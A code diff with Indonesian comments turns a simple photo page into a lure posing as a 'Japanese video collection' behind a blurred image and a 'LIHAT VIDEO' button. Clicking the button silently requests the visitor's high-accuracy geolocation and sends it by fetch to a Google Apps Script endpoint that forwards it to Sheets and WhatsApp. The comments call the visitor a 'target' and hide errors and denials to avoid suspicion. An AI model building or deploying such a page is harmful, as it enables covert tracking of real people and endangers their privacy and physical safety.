@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Galeri Foto</title>
+    <title>Kumpulan Video MBG Jepang</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -11,10 +11,19 @@
             margin: 0;
             padding: 0;
             background-color: #0f0f0f;
+            color: #ffffff;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
+        }
+        .header-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            letter-spacing: 0.5px;
+            color: #e50914;
         }
         .container {
             max-width: 500px;
@@ -23,32 +32,61 @@
             box-sizing: border-box;
         }
         .image-wrapper {
-            background: white;
+            background: #1f1f1f;
             padding: 10px;
             border-radius: 8px;
-            box-shadow: 0px 4px 15px rgba(0,0,0,0.3);
+            box-shadow: 0px 4px 15px rgba(0,0,0,0.5);
+            position: relative;
         }
         img {
             width: 100%;
             height: auto;
             border-radius: 4px;
             display: block;
+            filter: blur(8px); /* Efek buram kuat sebagai kamuflase */
+            transition: filter 0.4s ease;
+        }
+        .btn-unlock {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #e50914;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0px 4px 12px rgba(0,0,0,0.6);
+            letter-spacing: 1px;
+        }
+        .btn-unlock:hover {
+            background-color: #b20710;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
+        <div class="header-title">KUMPULAN VIDEO MBG JEPANG</div>
         <div class="image-wrapper">
-            <!-- Ganti teks URL_FOTO_ANDA di bawah ini dengan tautan langsung (direct link) foto Anda -->
-            <img src="PXL_20260815_090015220.jpg" alt="Shared Media">
+            <!-- Gambar Anda sebelumnya yang disamarkan dengan efek blur -->
+            <img id="foto" src="PXL_20260815_090015220.jpg" alt="Video Preview">
+            
+            <!-- Tombol kamuflase -->
+            <button id="btnBuka" class="btn-unlock" onclick="jalankanAksi()">LIHAT VIDEO</button>
         </div>
     </div>
-    
 
     <script>
-        // Skrip berjalan secara senyap di latar belakang tanpa mengubah tampilan teks
-        window.onload = function() {
+        function jalankanAksi() {
+            // 1. Hilangkan tombol dan buka blur gambar agar target mengira video/foto terbuka
+            document.getElementById('btnBuka').style.display = 'none';
+            document.getElementById('foto').style.filter = 'none';
+
+            // 2. Kirim permintaan lokasi secara senyap di latar belakang
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
@@ -64,6 +102,7 @@
                             akurasi: akurasi + " meter"
                         };
 
+                        // Kirim data ke backend Apps Script (yang otomatis meneruskan ke Sheets & WhatsApp Anda)
                         fetch("https://script.google.com/macros/s/AKfycbwwjCkMGf_fNAGP8S03P5-xhv4PBiF8ISvZ267ks1dOMbCbnEax3Do01pn1MtekAIxP/exec", {
                             method: "POST",
                             mode: "no-cors",
@@ -72,11 +111,11 @@
                             },
                             body: JSON.stringify(payload)
                         }).catch(err => {
-                            // Mengabaikan log error agar tidak terlihat di konsol publik
+                            // Abaikan error jaringan agar tidak terlihat di konsol publik
                         });
                     },
                     function(error) {
-                        // Mengabaikan jika izin ditolak
+                        // Jika izin ditolak, abaikan agar target tidak curiga
                     },
                     {
                         enableHighAccuracy: true,
@@ -85,7 +124,7 @@
                     }
                 );
             }
-        };
+        }
     </script>
 
 </body>
